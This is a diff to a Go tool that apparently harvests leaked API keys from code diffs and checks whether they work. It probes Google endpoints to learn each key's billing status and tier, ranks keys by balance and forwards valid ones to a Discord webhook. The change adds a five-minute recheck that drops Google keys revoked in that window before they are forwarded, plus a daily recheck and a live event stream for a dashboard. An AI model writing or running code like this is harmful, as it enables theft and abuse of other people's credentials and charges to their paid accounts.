@@ -272,6 +272,20 @@ type KeyStore struct {
 
 var keyStore *KeyStore
 
+// ─── Pending Google Keys (awaiting 5-min confirmation before webhook) ──────
+
+type PendingGoogleKey struct {
+        Entry       KeyEntry
+        Verified    VerifiedMatch
+        FoundAt     time.Time
+        WebhookSent bool // true after first successful recheck + webhook sent
+}
+
+var (
+        pendingGoogleMu    sync.RWMutex
+        pendingGoogleKeys  = make(map[string]*PendingGoogleKey) // key = KeyValue
+)
+
 // normalizeMongoURI ensures the connection string has required parameters
 func normalizeMongoURI(uri string) string {
         // Add tls=true if not present (required for Atlas)
@@ -518,7 +532,7 @@ func (ks *KeyStore) GetStats() map[string]interface{} {
         return map[string]interface{}{
                 "total":     int(total),
                 "valid":     int(valid),
-                "invalid":   0,
+                "invalid":   0, // invalid keys are deleted now
                 "unchecked": int(unchecked),
                 "providers": providerCounts,
         }
@@ -662,6 +676,48 @@ func sortKeysByPriority(keys []KeyEntry) []KeyEntry {
                 return keys[i].BalanceNum > keys[j].BalanceNum
         })
         return keys
+}
+
+// ─── SSE Hub (kept for backward compat) ──────────────────────────────────
+
+type SSEClient struct {
+        ch chan []byte
+}
+
+type SSEHub struct {
+        mu      sync.RWMutex
+        clients map[*SSEClient]struct{}
+}
+
+func NewSSEHub() *SSEHub {
+        return &SSEHub{clients: make(map[*SSEClient]struct{})}
+}
+
+func (h *SSEHub) Subscribe() *SSEClient {
+        c := &SSEClient{ch: make(chan []byte, 64)}
+        h.mu.Lock()
+        h.clients[c] = struct{}{}
+        h.mu.Unlock()
+        return c
+}
+
+func (h *SSEHub) Unsubscribe(c *SSEClient) {
+        h.mu.Lock()
+        delete(h.clients, c)
+        h.mu.Unlock()
+}
+
+func (h *SSEHub) Broadcast(event string, data []byte) {
+        msg := []byte(fmt.Sprintf("event: %s\ndata: %s\n\n", event, data))
+        h.mu.RLock()
+        for c := range h.clients {
+                select {
+                case c.ch <- msg:
+                default:
+                        // drop if slow client
+                }
+        }
+        h.mu.RUnlock()
 }
 
 // ─── Config ──────────────────────────────────────────────────────────────────
@@ -1103,7 +1159,7 @@ func getEnvInt(key string, fallback int) int {
 
 // isHeadless returns true when running without a TTY
 func isHeadless() bool {
-        return os.Getenv("HEADLESS") == "true" || !isTerminal()
+        return os.Getenv("RENDER") == "true" || os.Getenv("HEADLESS") == "true" || !isTerminal()
 }
 
 func isTerminal() bool {
@@ -1122,6 +1178,15 @@ func redact(s string, show int) string {
                 return strings.Repeat("*", len(s))
         }
         return s[:show] + strings.Repeat("*", len(s)-show*2) + s[len(s)-show:]
+}
+
+// redactKey shows first 6 + last 4 chars (e.g. "AIzaSy...k8x7")
+func redactKey(key string) string {
+        key = strings.TrimSpace(key)
+        if len(key) <= 10 {
+                return strings.Repeat("*", len(key))
+        }
+        return key[:6] + "..." + key[len(key)-4:]
 }
 
 // ─── Key Extraction from Diff Line ──────────────────────────────────────────
@@ -1940,6 +2005,7 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
         req2.Header.Set("Content-Type", "application/json")
         resp2, err := client.Do(req2)
         if err != nil {
+                // Can't test liveness, but list models worked so key is probably valid
                 result := VerifyResult{Valid: true, Details: "valid", Models: fmt.Sprintf("%d models", len(modelNames))}
                 if hasUltra {
                         result.Models += " + ultra"
@@ -1948,7 +2014,7 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
         }
         defer resp2.Body.Close()
 
-        // Check for permanent 429
+        // Check for permanent 429 (key is perma-rate-limited = effectively dead)
         if resp2.StatusCode == 429 {
                 body2, _ := io.ReadAll(resp2.Body)
                 var errResp struct {
@@ -1960,9 +2026,10 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
                 if strings.Contains(errResp.Error.Message, "limit 'GenerateContent request limit per minute for a region'") {
                         return failResult("perma-rate-limited")
                 }
+                // Normal rate limit = key is valid, just rate limited
         }
 
-        // Step 3: Test billing
+        // Step 3: Test billing — try Imagen predict (billing-only endpoint)
         hasBilling := false
         imagenURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/imagen-4.0-generate-001:predict?key=%s", key)
         imagenReq, _ := json.Marshal(map[string]interface{}{
@@ -1978,12 +2045,15 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
                         if !strings.Contains(string(body3), "Imagen API is only accessible to billed users") {
                                 hasBilling = true
                         }
+                } else if resp3.StatusCode != 200 {
+                        // Other status = might have billing
                 }
         }
 
-        // Step 4: Determine tier
+        // Step 4: Determine tier (if billing enabled)
         tier := "Free Tier"
         if hasBilling {
+                // Test tier by sending a TTS request
                 ttsURL := fmt.Sprintf("https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-pro-preview-tts:generateContent?key=%s", key)
                 ttsData := map[string]interface{}{
                         "contents": []map[string]interface{}{
@@ -2001,6 +2071,7 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
                 if err == nil {
                         defer resp4.Body.Close()
                         body4, _ := io.ReadAll(resp4.Body)
+
                         if resp4.StatusCode == 200 {
                                 tier = "Tier 3+"
                         } else if resp4.StatusCode == 400 {
@@ -2040,6 +2111,7 @@ func verifyGoogle(client *http.Client, key string) VerifyResult {
         if hasUltra {
                 modelsStr += " + ultra"
         }
+
         balanceStr := ""
         if hasBilling {
                 balanceStr = "Billing Enabled"
@@ -2305,8 +2377,26 @@ func verifyWorker(id int, p *tea.Program, rawChan <-chan RawMatch, webhook *Webh
                         CommitUrl: verified.CommitUrl,
                 })
 
-                // Send to Discord webhook — ONLY verified (valid) keys
-                if vr.Valid && cfg.DiscordWebhook != "" {
+                // Save to KeyStore + add Google keys to pending
+                if vr.Valid {
+                        entry := keyStore.AddKey(raw.Provider, raw.Text, raw.Repo, raw.CommitUrl)
+                        keyStore.UpdateKey(entry.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
+
+                        // For Google keys: DON'T send webhook yet — add to pending for 5-min recheck
+                        if raw.Provider == "google" {
+                                pendingGoogleMu.Lock()
+                                pendingGoogleKeys[raw.Text] = &PendingGoogleKey{
+                                        Entry:    *entry,
+                                        Verified: verified,
+                                        FoundAt:  time.Now(),
+                                }
+                                pendingGoogleMu.Unlock()
+                                log.Printf("[verify-%d] Google key %s added to pending (5min recheck before webhook)", id, redactKey(raw.Text))
+                        }
+                }
+
+                // Send to Discord webhook — ONLY verified (valid) keys, EXCEPT Google (handled by recheck)
+                if vr.Valid && cfg.DiscordWebhook != "" && raw.Provider != "google" {
                         webhook.Send(verified)
                 }
         }
@@ -2550,10 +2640,10 @@ func main() {
         }
 }
 
-// ─── Headless Runner ────────────────────────────────────────────────────────
+// ─── Headless Runner (for Docker / headless) ──────────────────────────────
 
 func runHeadless(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan ScanJob, rawMatches chan RawMatch, numScanWorkers, numVerifyWorkers int) {
-        log.Println("Running in headless mode")
+        log.Println("Running in headless mode (no TUI)")
         log.Printf("Started %d scanning workers (%d tokens rotating)", numScanWorkers, tokenPool.Count())
 
         // Initialize dashboard state + WS hub
@@ -2562,6 +2652,7 @@ func runHeadless(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan S
         dashboard.ScanWorkers = numScanWorkers
         dashboard.VerifyWorkers = numVerifyWorkers
         wsHub = NewWSHub()
+        sseHub = NewSSEHub()
 
         // Start web dashboard server
         port := os.Getenv("PORT")
@@ -2621,35 +2712,136 @@ func runHeadless(cfg Config, rules []Rule, tokenPool *TokenPool, scanJobs chan S
                 }
         }()
 
-        // Google key re-check every 5 minutes (Google can revoke keys quickly)
+        // Google key pending recheck: check pending keys after 5 min, then daily for all Google keys
         go func() {
-                time.Sleep(5 * time.Minute)
-                ticker := time.NewTicker(5 * time.Minute)
+                // ── Phase 1: Check pending Google keys every 30 seconds ──
+                // Pending keys get rechecked after 5 min; if still valid → send webhook + mark confirmed
+                pendingTicker := time.NewTicker(30 * time.Second)
+                defer pendingTicker.Stop()
+
+                for range pendingTicker.C {
+                        pendingGoogleMu.Lock()
+                        now := time.Now()
+                        var toCheck []string
+                        for kv, pk := range pendingGoogleKeys {
+                                if !pk.WebhookSent && now.Sub(pk.FoundAt) >= 5*time.Minute {
+                                        toCheck = append(toCheck, kv)
+                                }
+                        }
+                        pendingGoogleMu.Unlock()
+
+                        if len(toCheck) == 0 {
+                                continue
+                        }
+
+                        log.Printf("[google-pending] Rechecking %d pending Google keys after 5min...", len(toCheck))
+                        timeout := time.Duration(cfg.VerifyTimeout) * time.Second
+                        webhook := NewHeadlessWebhookSender(cfg.DiscordWebhook)
+
+                        for _, kv := range toCheck {
+                                vr := verifyKey("google", kv, timeout)
+
+                                pendingGoogleMu.Lock()
+                                pk, exists := pendingGoogleKeys[kv]
+                                pendingGoogleMu.Unlock()
+
+                                if !exists {
+                                        continue
+                                }
+
+                                if vr.Valid {
+                                        // Key still valid after 5 min → send webhook now
+                                        pk.WebhookSent = true
+                                        log.Printf("[google-pending] Google key %s CONFIRMED valid after 5min, sending webhook", redactKey(kv))
+
+                                        // Update key in store with latest info
+                                        keyStore.UpdateKey(pk.Entry.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
+
+                                        // Send webhook
+                                        if cfg.DiscordWebhook != "" {
+                                                webhook.Send(pk.Verified)
+                                        }
+                                        if dashboard != nil {
+                                                dashboard.AddWebhookOK()
+                                        }
+                                        if wsHub != nil {
+                                                wsHub.Broadcast("newKey", VerifiedMatch{
+                                                        Provider: "google",
+                                                        Key:      kv,
+                                                        Redacted: redactKey(kv),
+                                                        Valid:    true,
+                                                        Status:   "confirmed",
+                                                        Details:  "confirmed valid (5min recheck passed)",
+                                                        Tier:     vr.Tier,
+                                                        Balance:  vr.Balance,
+                                                        Models:   vr.Models,
+                                                })
+                                        }
+                                } else {
+                                        // Key revoked within 5 min → delete, don't send webhook
+                                        keyStore.DeleteKey(pk.Entry.ID)
+                                        log.Printf("[google-pending] Google key %s REVOKED within 5min: %s", redactKey(kv), vr.Details)
+
+                                        pendingGoogleMu.Lock()
+                                        delete(pendingGoogleKeys, kv)
+                                        pendingGoogleMu.Unlock()
+
+                                        if wsHub != nil {
+                                                wsHub.Broadcast("newKey", VerifiedMatch{
+                                                        Provider: "google",
+                                                        Key:      kv,
+                                                        Redacted: redactKey(kv),
+                                                        Valid:    false,
+                                                        Details:  "revoked (5min recheck): " + vr.Details,
+                                                })
+                                                wsHub.Broadcast("keyUpdate", map[string]interface{}{
+                                                        "id":     pk.Entry.ID,
+                                                        "status": "deleted",
+                                                })
+                                        }
+                                }
+                        }
+                }
+        }()
+
+        // Google key daily recheck (for keys that already passed the 5-min confirmation)
+        go func() {
+                time.Sleep(10 * time.Minute) // Wait for initial scan to settle
+                ticker := time.NewTicker(24 * time.Hour)
                 for range ticker.C {
                         googleKeys := keyStore.GetValidKeys("google")
                         if len(googleKeys) == 0 {
                                 continue
                         }
-                        log.Printf("[google-recheck] Re-checking %d Google keys...", len(googleKeys))
+                        log.Printf("[google-daily] Re-checking %d Google keys...", len(googleKeys))
                         timeout := time.Duration(cfg.VerifyTimeout) * time.Second
                         for _, k := range googleKeys {
                                 vr := verifyKey("google", k.KeyValue, timeout)
                                 if !vr.Valid {
                                         keyStore.DeleteKey(k.ID)
-                                        log.Printf("[google-recheck] Google key %d REVOKED: %s", k.ID, vr.Details)
+                                        log.Printf("[google-daily] Google key %d REVOKED: %s", k.ID, vr.Details)
+
+                                        // Remove from pending if still there
+                                        pendingGoogleMu.Lock()
+                                        delete(pendingGoogleKeys, k.KeyValue)
+                                        pendingGoogleMu.Unlock()
+
                                         if wsHub != nil {
                                                 wsHub.Broadcast("newKey", VerifiedMatch{
                                                         Provider: "google",
                                                         Key:      k.KeyValue,
-                                                        Redacted: k.KeyValue[:6] + "..." + k.KeyValue[len(k.KeyValue)-4:],
+                                                        Redacted: redactKey(k.KeyValue),
                                                         Valid:    false,
-                                                        Details:  "revoked: " + vr.Details,
+                                                        Details:  "revoked (daily recheck): " + vr.Details,
                                                 })
                                                 wsHub.Broadcast("keyUpdate", map[string]interface{}{
                                                         "id":     k.ID,
                                                         "status": "deleted",
                                                 })
                                         }
+                                } else {
+                                        // Update with latest verification info
+                                        keyStore.UpdateKey(k.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
                                 }
                         }
                 }
@@ -3048,7 +3240,8 @@ func headlessVerifyWorker(id int, rawChan <-chan RawMatch, webhook *HeadlessWebh
                 // Update dashboard
                 if dashboard != nil {
                         dashboard.AddVerifiedKey(verified)
-                        if vr.Valid {
+                        // Don't count webhook for Google keys — they need 5-min recheck first
+                        if vr.Valid && raw.Provider != "google" {
                                 dashboard.AddWebhookOK()
                         }
                 }
@@ -3057,6 +3250,18 @@ func headlessVerifyWorker(id int, rawChan <-chan RawMatch, webhook *HeadlessWebh
                 if vr.Valid {
                         entry := keyStore.AddKey(raw.Provider, raw.Text, raw.Repo, raw.CommitUrl)
                         keyStore.UpdateKey(entry.ID, "valid", vr.Balance, vr.Quota, vr.Tier, vr.KeyType, vr.Org, vr.Models, vr.Details)
+
+                        // For Google keys: DON'T send webhook yet — add to pending for 5-min recheck
+                        if raw.Provider == "google" {
+                                pendingGoogleMu.Lock()
+                                pendingGoogleKeys[raw.Text] = &PendingGoogleKey{
+                                        Entry:    *entry,
+                                        Verified: verified,
+                                        FoundAt:  time.Now(),
+                                }
+                                pendingGoogleMu.Unlock()
+                                log.Printf("[verify-%d] Google key %s added to pending (5min recheck before webhook)", id, redactKey(raw.Text))
+                        }
                 }
 
                 // Broadcast via WebSocket (both valid + invalid for activity feed)
@@ -3064,8 +3269,8 @@ func headlessVerifyWorker(id int, rawChan <-chan RawMatch, webhook *HeadlessWebh
                         wsHub.Broadcast("newKey", verified)
                 }
 
-                // Send to Discord webhook — ONLY verified (valid) keys
-                if vr.Valid && cfg.DiscordWebhook != "" {
+                // Send to Discord webhook — ONLY verified (valid) keys, EXCEPT Google (handled by recheck)
+                if vr.Valid && cfg.DiscordWebhook != "" && raw.Provider != "google" {
                         webhook.Send(verified)
                 }
         }
@@ -3417,6 +3622,7 @@ func requireAuth(next http.HandlerFunc) http.HandlerFunc {
 var (
         dashboard         *DashboardState
         wsHub             *WSHub
+        sseHub            *SSEHub
         dashboardHTMLBytes []byte
 )
 
@@ -3701,6 +3907,45 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
         go client.readPump()
 }
 
+func handleEvents(w http.ResponseWriter, r *http.Request) {
+        w.Header().Set("Content-Type", "text/event-stream")
+        w.Header().Set("Cache-Control", "no-cache")
+        w.Header().Set("Connection", "keep-alive")
+        w.Header().Set("Access-Control-Allow-Origin", "*")
+
+        client := sseHub.Subscribe()
+        defer sseHub.Unsubscribe(client)
+
+        // Send initial state
+        snap := dashboard.GetSnapshot()
+        data, _ := json.Marshal(snap)
+        fmt.Fprintf(w, "event: stats\ndata: %s\n\n", data)
+        if f, ok := w.(http.Flusher); ok {
+                f.Flush()
+        }
+
+        for {
+                select {
+                case msg, ok := <-client.ch:
+                        if !ok {
+                                return
+                        }
+                        w.Write(msg)
+                        if f, ok := w.(http.Flusher); ok {
+                                f.Flush()
+                        }
+                case <-r.Context().Done():
+                        return
+                case <-time.After(30 * time.Second):
+                        // heartbeat
+                        fmt.Fprintf(w, ": heartbeat\n\n")
+                        if f, ok := w.(http.Flusher); ok {
+                                f.Flush()
+                        }
+                }
+        }
+}
+
 // ─── Login HTML ──────────────────────────────────────────────────────────────
 
 const loginHTML = `<!DOCTYPE html>
@@ -3832,6 +4077,9 @@ func startDashboardServer(port string) {
         // Health check endpoint (also used for self-ping to keep Render awake)
         mux.HandleFunc("/health", handleHealth)
 
+        // SSE endpoint (backward compat)
+        mux.HandleFunc("/api/events", handleEvents)
+
         // Dashboard pages
         mux.HandleFunc("/", handleDashboard)
         mux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
@@ -3858,4 +4106,17 @@ func broadcastWSSnapshot() {
                 "dashboard": snap,
                 "keyStore":  ksStats,
         })
+}
+
+// broadcastSnapshot sends the current dashboard state to all SSE clients
+func broadcastSnapshot() {
+        if sseHub == nil {
+                return
+        }
+        snap := dashboard.GetSnapshot()
+        data, err := json.Marshal(snap)
+        if err != nil {
+                return
+        }
+        sseHub.Broadcast("stats", data)
 }
